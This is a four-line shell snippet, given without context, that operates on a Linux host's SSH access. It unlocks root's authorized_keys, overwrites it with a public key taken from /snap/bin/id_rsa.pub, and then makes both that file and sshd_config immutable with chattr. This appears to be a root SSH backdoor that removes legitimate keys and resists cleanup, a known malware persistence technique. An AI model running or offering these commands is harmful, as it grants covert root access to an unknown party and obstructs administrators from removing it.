sudo chattr +i /etc/ssh/sshd_config
sudo chattr -i /root/.ssh/authorized_keys
sudo cat /snap/bin/id_rsa.pub >| /root/.ssh/authorized_keys
sudo chattr +i /root/.ssh/authorized_keys
